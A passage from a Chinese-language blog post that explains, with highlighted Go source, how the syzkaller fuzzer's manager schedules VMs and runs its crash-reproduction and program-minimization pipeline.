queued=%v&quot;</span>,</span><br><span class="line">         phase, shutdown == <span class="literal">nil</span>, instances.Len(), vmCount, instances.Snapshot(),</span><br><span class="line">         <span class="built_in">len</span>(pendingRepro), <span class="built_in">len</span>(reproducing), <span class="built_in">len</span>(reproQueue))</span><br><span class="line"></span><br><span class="line">canRepro := <span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">  <span class="keyword">return</span> phase &gt;= phaseTriagedHub &amp;&amp; <span class="built_in">len</span>(reproQueue) != <span class="number">0</span> &amp;&amp;</span><br><span class="line">  (<span class="keyword">int</span>(atomic.LoadUint32(&amp;mgr.numReproducing))+<span class="number">1</span>)*instancesPerRepro &lt;= maxReproVMs</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来先输出一段日志，随后定义了一个闭包函数<code>canRepro</code>，该函数的功能就是判断是否能够进行<code>crash</code>复现返回的是bool类型。</p><p>首先会判断当前阶段是否已经超过了<code>phaseTriagedHub</code>阶段，随后判断<code>reproQueue</code>也就是复现队列是否为空，最后判断加上该crash后用于复现的VM是否小于等于<code>maxReproVMs</code>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> shutdown != <span class="literal">nil</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> canRepro() &#123;</span><br><span class="line">    vmIndexes := instances.Take(instancesPerRepro)</span><br><span class="line">    <span class="keyword">if</span> vmIndexes == <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    &#125;</span><br><span class="line">    last := <span class="built_in">len</span>(reproQueue) - <span class="number">1</span></span><br><span class="line">    crash := reproQueue[last]</span><br><span class="line">    reproQueue[last] = <span class="literal">nil</span></span><br><span class="line">    reproQueue = reproQueue[:last]</span><br><span class="line">    atomic.AddUint32(&amp;mgr.numReproducing, <span class="number">1</span>)</span><br><span class="line">    log.Logf(<span class="number">0</span>, <span class="string">&quot;loop: starting repro of &#x27;%v&#x27; on instances %+v&quot;</span>, crash.Title, vmIndexes)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">      reproDone &lt;- mgr.runRepro(crash, vmIndexes, instances.Put)</span><br><span class="line">    &#125;()</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> !canRepro() &#123;</span><br><span class="line">    idx := instances.TakeOne()</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    &#125;</span><br><span class="line">    log.Logf(<span class="number">1</span>, <span class="string">&quot;loop: starting instance %v&quot;</span>, *idx)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">      crash, err := mgr.runInstance(*idx)</span><br><span class="line">      runDone &lt;- &amp;RunResult&#123;*idx, crash, err&#125;</span><br><span class="line">    &#125;()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里首先会判断<code>shutdown</code>，然后进入道两个小循环中。首先看第一个小循环，洗衣歌循环的进入条件就是能够进行<code>crash</code>复现。</p><p>这里首先从资源池中取出一个<code>vmIndexes</code>，如果返回的是<code>nil</code>则直接退出循环。随后从<code>reproQueue</code>中取出一个<code>crash</code>，随后更新<code>mgr.numReproducing</code>计数。随后新开启一个写成调用<code>mgr.runRepro</code>对<code>crash</code>进行复现，并将返回值输入到<code>reproDone</code>队列中。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(mgr *Manager)</span> <span class="title">runRepro</span><span class="params">(crash *Crash, vmIndexes []<span class="keyword">int</span>, putInstances <span class="keyword">func</span>(...<span class="keyword">int</span>)</span>) *<span class="title">ReproResult</span></span> &#123;</span><br><span class="line">features := mgr.checkResult.Features</span><br><span class="line">res, stats, err := repro.Run(crash.Output, mgr.cfg, features, mgr.reporter, mgr.vmPool, vmIndexes)</span><br><span class="line">ret := &amp;ReproResult&#123;</span><br><span class="line">instances: vmIndexes,</span><br><span class="line">report0:   crash.Report,</span><br><span class="line">repro:     res,</span><br><span class="line">stats:     stats,</span><br><span class="line">err:       err,</span><br><span class="line">hub:       crash.hub,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &amp;&amp; res != <span class="literal">nil</span> &amp;&amp; mgr.cfg.StraceBin != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line"><span class="comment">// We need only one instance to get strace output, release the rest.</span></span><br><span class="line">putInstances(vmIndexes[<span class="number">1</span>:]...)</span><br><span class="line"><span class="keyword">defer</span> putInstances(vmIndexes[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> straceAttempts = <span class="number">2</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= straceAttempts; i++ &#123;</span><br><span class="line">strace := repro.RunStrace(res, mgr.cfg, mgr.reporter, mgr.vmPool, vmIndexes[<span class="number">0</span>])</span><br><span class="line">sameBug := strace.IsSameBug(res)</span><br><span class="line">log.Logf(<span class="number">0</span>, <span class="string">&quot;strace run attempt %d/%d for &#x27;%s&#x27;: same bug %v, error %v&quot;</span>,</span><br><span class="line">i, straceAttempts, res.Report.Title, sameBug, strace.Error)</span><br><span class="line"><span class="comment">// We only want to save strace output if it resulted in the same bug.</span></span><br><span class="line"><span class="comment">// Otherwise, it will be hard to reproduce on syzbot and will confuse users.</span></span><br><span class="line"><span class="keyword">if</span> sameBug &#123;</span><br><span class="line">ret.strace = strace</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">putInstances(vmIndexes...)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里主要做的事情其实就是直接调用了<code>repro.Run</code>函数，并且在后面进行了一下检查之后将vm重新放回资源池中。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Run</span><span class="params">(crashLog []<span class="keyword">byte</span>, cfg *mgrconfig.Config, features *host.Features, reporter *report.Reporter,</span></span></span><br><span class="line"><span class="params"><span class="function">vmPool *vm.Pool, vmIndexes []<span class="keyword">int</span>)</span> <span class="params">(*Result, *Stats, error)</span></span> &#123;</span><br><span class="line">ctx, err := prepareCtx(crashLog, cfg, features, reporter, <span class="built_in">len</span>(vmIndexes))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line">wg.Add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> wg.Done()</span><br><span class="line">ctx.createInstances(cfg, vmPool)</span><br><span class="line">&#125;()</span><br><span class="line"><span class="comment">// Prepare VMs in advance.</span></span><br><span class="line"><span class="keyword">for</span> _, idx := <span class="keyword">range</span> vmIndexes &#123;</span><br><span class="line">ctx.bootRequests &lt;- idx</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Wait until all VMs are really released.</span></span><br><span class="line"><span class="keyword">defer</span> wg.Wait()</span><br><span class="line"><span class="keyword">return</span> ctx.run()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里首先调用了<code>prepareCtx</code>函数。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">prepareCtx</span><span class="params">(crashLog []<span class="keyword">byte</span>, cfg *mgrconfig.Config, features *host.Features, reporter *report.Reporter,</span></span></span><br><span class="line"><span class="params"><span class="function">VMs <span class="keyword">int</span>)</span> <span class="params">(*context, error)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> VMs == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;no VMs provided&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">entries := cfg.Target.ParseLog(crashLog)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(entries) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, ErrNoPrograms</span><br><span class="line">&#125;</span><br><span class="line">crashStart := <span class="built_in">len</span>(crashLog)</span><br><span class="line">crashTitle, crashType := <span class="string">&quot;&quot;</span>, crash.UnknownType</span><br><span class="line"><span class="keyword">if</span> rep := reporter.Parse(crashLog); rep != <span class="literal">nil</span> &#123;</span><br><span class="line">crashStart = rep.StartPos</span><br><span class="line">crashTitle = rep.Title</span><br><span class="line">crashType = rep.Type</span><br><span class="line">&#125;</span><br><span class="line">testTimeouts := []time.Duration&#123;</span><br><span class="line"><span class="number">3</span> * cfg.Timeouts.Program, <span class="comment">// to catch simpler crashes (i.e. no races and no hangs)</span></span><br><span class="line"><span class="number">20</span> * cfg.Timeouts.Program,</span><br><span class="line">cfg.Timeouts.NoOutputRunningTime, <span class="comment">// to catch &quot;no output&quot;, races and hangs</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> &#123;</span><br><span class="line"><span class="keyword">case</span> crashTitle == <span class="string">&quot;&quot;</span>:</span><br><span class="line">crashTitle = <span class="string">&quot;no output/lost connection&quot;</span></span><br><span class="line"><span class="comment">// Lost connection can be detected faster,</span></span><br><span class="line"><span class="comment">// but theoretically if it&#x27;s caused by a race it may need the largest timeout.</span></span><br><span class="line"><span class="comment">// No output can only be reproduced with the max timeout.</span></span><br><span class="line"><span class="comment">// As a compromise we use the smallest and the largest timeouts.</span></span><br><span class="line">testTimeouts = []time.Duration&#123;testTimeouts[<span class="number">0</span>], testTimeouts[<span class="number">2</span>]&#125;</span><br><span class="line"><span class="keyword">case</span> crashType == crash.MemoryLeak:</span><br><span class="line"><span class="comment">// Memory leaks can&#x27;t be detected quickly because of expensive setup and scanning.</span></span><br><span class="line">testTimeouts = testTimeouts[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">case</span> crashType == crash.Hang:</span><br><span class="line">testTimeouts = testTimeouts[<span class="number">2</span>:]</span><br><span class="line">&#125;</span><br><span class="line">ctx := &amp;context&#123;</span><br><span class="line">target:       cfg.SysTarget,</span><br><span class="line">reporter:     reporter,</span><br><span class="line">crashTitle:   crashTitle,</span><br><span class="line">crashType:    crashType,</span><br><span class="line">crashStart:   crashStart,</span><br><span class="line">entries:      entries,</span><br><span class="line">instances:    <span class="built_in">make</span>(<span class="keyword">chan</span> *reproInstance, VMs),</span><br><span class="line">bootRequests: <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, VMs),</span><br><span class="line">testTimeouts: testTimeouts,</span><br><span class="line">startOpts:    createStartOptions(cfg, features, crashType),</span><br><span class="line">stats:        <span class="built_in">new</span>(Stats),</span><br><span class="line">timeouts:     cfg.Timeouts,</span><br><span class="line">&#125;</span><br><span class="line">ctx.reproLogf(<span class="number">0</span>, <span class="string">&quot;%v programs, %v VMs, timeouts %v&quot;</span>, <span class="built_in">len</span>(entries), VMs, testTimeouts)</span><br><span class="line"><span class="keyword">return</span> ctx, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数内部主要做的事就是一些检测然后初始化ctx，函数结束之后定义可一个<code>sync.WaitGroup</code>类型的变量。随后创建一个新的协程调用<code>ctx.createInstances</code>函数。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ctx *context)</span> <span class="title">createInstances</span><span class="params">(cfg *mgrconfig.Config, vmPool *vm.Pool)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"><span class="keyword">for</span> vmIndex := <span class="keyword">range</span> ctx.bootRequests &#123;</span><br><span class="line">wg.Add(<span class="number">1</span>)</span><br><span class="line">vmIndex := vmIndex</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> wg.Done()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> inst *instance.ExecProgInstance</span><br><span class="line">maxTry := <span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> try := <span class="number">0</span>; try &lt; maxTry; try++ &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-vm.Shutdown:</span><br><span class="line">try = maxTry</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line">inst, err = instance.CreateExecProgInstance(vmPool, vmIndex, cfg,</span><br><span class="line">ctx.reporter, &amp;instance.OptionalConfig&#123;Logf: ctx.reproLogf&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">ctx.reproLogf(<span class="number">0</span>, <span class="string">&quot;failed to init instance: %v, attempt %d/%d&quot;</span>,</span><br><span class="line">err, try+<span class="number">1</span>, maxTry)</span><br><span class="line">time.Sleep(<span class="number">10</span> * time.Second)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> inst != <span class="literal">nil</span> &#123;</span><br><span class="line">ctx.instances &lt;- &amp;reproInstance&#123;execProg: inst, index: vmIndex&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line">wg.Wait()</span><br><span class="line"><span class="comment">// Clean up.</span></span><br><span class="line"><span class="built_in">close</span>(ctx.instances)</span><br><span class="line"><span class="keyword">for</span> inst := <span class="keyword">range</span> ctx.instances &#123;</span><br><span class="line">inst.execProg.Close()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数中，循环获取<code>vmIndex</code>，并且开启新的协程，在新的协程中调用<code>instance.CreateExecProgInstance</code>函数创建VM并拷贝<code>crash</code>程序，如果失败则休眠十秒如果成功则将结果输出到<code>ctx.instances</code>中，这里的最多尝试次数为<code>maxTry</code>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CreateExecProgInstance</span><span class="params">(vmPool *vm.Pool, vmIndex <span class="keyword">int</span>, mgrCfg *mgrconfig.Config,</span></span></span><br><span class="line"><span class="params"><span class="function">reporter *report.Reporter, opt *OptionalConfig)</span> <span class="params">(*ExecProgInstance, error)</span></span> &#123;</span><br><span class="line">vmInst, err := vmPool.Create(vmIndex)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;failed to create VM: %w&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">ret, err := SetupExecProg(vmInst, mgrCfg, reporter, opt)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">vmInst.Close()</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<code>CreateExecProgInstance</code>函数的实现就是通过<code>vmPool.Create</code>创建启动虚拟机之后调用<code>SetupExecProg</code>函数拷贝要执行的二进制文件。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ctx *context)</span> <span class="title">run</span><span class="params">()</span> <span class="params">(*Result, *Stats, error)</span></span> &#123;</span><br><span class="line"><span class="comment">// Indicate that we no longer need VMs.</span></span><br><span class="line"><span class="keyword">defer</span> <span class="built_in">close</span>(ctx.bootRequests)</span><br><span class="line"></span><br><span class="line">res, err := ctx.repro()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> res != <span class="literal">nil</span> &#123;</span><br><span class="line">ctx.reproLogf(<span class="number">3</span>, <span class="string">&quot;repro crashed as (corrupted=%v):\n%s&quot;</span>,</span><br><span class="line">ctx.report.Corrupted, ctx.report.Report)</span><br><span class="line"><span class="comment">// Try to rerun the repro if the report is corrupted.</span></span><br><span class="line"><span class="keyword">for</span> attempts := <span class="number">0</span>; ctx.report.Corrupted &amp;&amp; attempts &lt; <span class="number">3</span>; attempts++ &#123;</span><br><span class="line">ctx.reproLogf(<span class="number">3</span>, <span class="string">&quot;report is corrupted, running repro again&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> res.CRepro &#123;</span><br><span class="line">_, err = ctx.testCProg(res.Prog, res.Duration, res.Opts)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">_, err = ctx.testProg(res.Prog, res.Duration, res.Opts)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ctx.reproLogf(<span class="number">3</span>, <span class="string">&quot;final repro crashed as (corrupted=%v):\n%s&quot;</span>,</span><br><span class="line">ctx.report.Corrupted, ctx.report.Report)</span><br><span class="line">res.Report = ctx.report</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res, ctx.stats, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回到前面的<code>RUN</code>函数，最后会调用到<code>ctx.run()</code>，进入到上面的这个函数中，而在这个函数中则是调用<code>ctx.repro()</code>正式进行复现的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ctx *context)</span> <span class="title">repro</span><span class="params">()</span> <span class="params">(*Result, error)</span></span> &#123;</span><br><span class="line"><span class="comment">// Cut programs that were executed after crash.</span></span><br><span class="line"><span class="keyword">for</span> i, ent := <span class="keyword">range</span> ctx.entries &#123;</span><br><span class="line"><span class="keyword">if</span> ent.Start &gt; ctx.crashStart &#123;</span><br><span class="line">ctx.entries = ctx.entries[:i]</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">reproStart := time.Now()</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">ctx.reproLogf(<span class="number">3</span>, <span class="string">&quot;reproducing took %s&quot;</span>, time.Since(reproStart))</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">res, err := ctx.extractProg(ctx.entries)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> res == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> res != <span class="literal">nil</span> &#123;</span><br><span class="line">res.Opts.Repro = <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">res, err = ctx.minimizeProg(res)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Try extracting C repro without simplifying options first.</span></span><br><span class="line">res, err = ctx.extractC(res)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Simplify options and try extracting C repro.</span></span><br><span class="line"><span class="keyword">if</span> !res.CRepro &#123;</span><br><span class="line">res, err = ctx.simplifyProg(res)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Simplify C related options.</span></span><br><span class="line"><span class="keyword">if</span> res.CRepro &#123;</span><br><span class="line">res, err = ctx.simplifyC(res)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> res, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里首先会去除掉发生<code>crash</code>之后执行的程序，随后调用<code>ctx.extractProg</code>获取触发<code>crash</code>的集合，接着调用<code>ctx.minimizeProg</code>尝试最小化程序集合，调用<code>ctx.extractC</code>函数尝试在不简化配置的情况下提取<code>C repro</code>，然后调用<code>ctx.simplifyProg</code>简化配置并尝试提取<code>C repro</code>，最后调用<code>ctx.simplifyC</code>简化C相关配置。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ctx *context)</span> <span class="title">extractProg</span><span class="params">(entries []*prog.LogEntry)</span> <span class="params">(*Result, error)</span></span> &#123;</span><br><span class="line">ctx.reproLogf(<span class="number">2</span>, <span class="string">&quot;extracting reproducer from %v programs&quot;</span>, <span class="built_in">len</span>(entries))</span><br><span class="line">start := 